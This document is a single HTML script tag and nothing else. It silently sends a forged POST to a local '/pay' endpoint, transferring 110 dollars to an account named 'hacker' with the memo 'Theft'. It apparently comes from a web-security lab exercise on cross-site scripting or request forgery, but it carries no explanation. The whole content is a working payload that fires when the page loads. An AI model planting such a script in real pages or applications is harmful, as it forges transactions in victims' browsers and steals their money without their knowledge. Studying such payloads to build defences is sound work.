<script>
var x = new XMLHttpRequest();
x.open('POST', 'http://localhost:5000/pay');
x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
x.send('account=hacker&dollars=110&memo=Theft');
</script>
